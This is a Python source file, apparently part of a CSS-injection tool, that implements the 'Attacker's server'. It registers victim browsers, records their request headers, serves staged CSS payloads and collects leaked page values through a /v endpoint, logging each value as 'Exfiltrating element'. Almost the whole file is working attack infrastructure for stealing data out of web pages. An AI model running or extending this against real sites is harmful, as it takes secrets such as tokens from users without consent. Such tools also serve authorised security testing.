import argparse
import asyncio
import contextlib
import signal

from aiohttp import web
from aiohttp.typedefs import Handler

from cssinj.client import Client, Clients
from cssinj.console import Console, LogLevel
from cssinj.file import OutputFile
from cssinj.strategies import build_strategy
from cssinj.utils.error import InjectionError


class Server:
    def __init__(
        self,
        clients: Clients,
        args: argparse.Namespace,
        output_file: OutputFile | None,
    ) -> None:
        self.hostname: str = args.hostname
        self.port: int = args.port
        self.show_details: bool = args.details
        self.clients = clients
        self.output_file = output_file
        self.strategy = build_strategy(args)
        self.runner: web.AppRunner | None = None

        self.app = web.Application(middlewares=[self.error_middleware])
        self.app.add_routes(
            [
                web.get('/start', self.handle_start),
                web.get('/n', self.handle_next),
                web.get('/v', self.handle_valid),
                web.get('/e', self.handle_end),
            ],
        )

    async def run(self) -> None:
        self.runner = web.AppRunner(self.app)
        await self.runner.setup()
        site = web.TCPSite(self.runner, self.hostname, self.port)
        await site.start()
        Console.log(LogLevel.SERVER, f"Attacker's server started on {self.hostname}:{self.port}")

        stop_event = asyncio.Event()
        loop = asyncio.get_running_loop()
        for sig in (signal.SIGINT, signal.SIGTERM):
            with contextlib.suppress(NotImplementedError):
                loop.add_signal_handler(sig, stop_event.set)
        try:
            await stop_event.wait()
        finally:
            await self.stop()

    async def stop(self) -> None:
        Console.log(LogLevel.SERVER, "Attacker's server cleaning up.")
        if self.runner is not None:
            await self.runner.cleanup()
        Console.log(LogLevel.SERVER, "Attacker's server stopped.")

    async def handle_start(self, request: web.Request) -> web.Response:
        client = self.clients.register(
            Client(
                host=request.remote or '?',
                accept=request.headers.get('accept'),
                headers=dict(request.headers),
                event=asyncio.Event(),
            ),
        )
        if self.output_file is not None:
            self.output_file.update()
        Console.log(LogLevel.CONNECTION, f'Connection from {client.host}')
        Console.log(LogLevel.CONNECTION_DETAILS, f'ID : {client.id}')
        client.event.set()

        if self.show_details:
            for key, value in request.headers.items():
                Console.log(LogLevel.CONNECTION_DETAILS, f'{key} : {value}')

        return web.Response(
            text=self.strategy.generate_start_payload(client),
            content_type='text/css',
        )

    async def handle_end(self, request: web.Request) -> web.Response:
        client = self._get_client(request)
        body = self.strategy.handle_end(client)
        if self.output_file is not None:
            self.output_file.update()
        client.event.set()
        return web.Response(text=body, content_type='text/css')

    async def handle_next(self, request: web.Request) -> web.Response:
        client = self._get_client(request)
        client.counter += 1
        await client.event.wait()
        client.event.clear()
        return web.Response(
            text=self.strategy.generate_next_payload(client),
            content_type='text/css',
        )

    async def handle_valid(self, request: web.Request) -> web.Response:
        client = self._get_client(request)
        data = request.query.get('t')
        if data is None:
            raise web.HTTPBadRequest(text='missing t')

        client.event.set()
        self.strategy.handle_valid(client, data)

        if self.output_file is not None:
            self.output_file.update()
        if self.show_details:
            Console.log(LogLevel.EXFILTRATION, f'[{client.id}] - Exfiltrating element: {data}')

        return web.Response(text='ok', content_type='text/css')

    @web.middleware
    async def error_middleware(self, request: web.Request, handler: Handler) -> web.StreamResponse:
        try:
            return await handler(request)
        except web.HTTPException:
            raise
        except Exception as ex:
            Console.error_handler(ex, context={'source': 'middleware', 'path': request.path})
            return web.Response(text='500: Internal Server Error', status=500)

    def _get_client(self, request: web.Request) -> Client:
        client = self.clients.get_by_id(request.query.get('cid'))
        if client is None:
            raise InjectionError('Unknown client id')
        return client
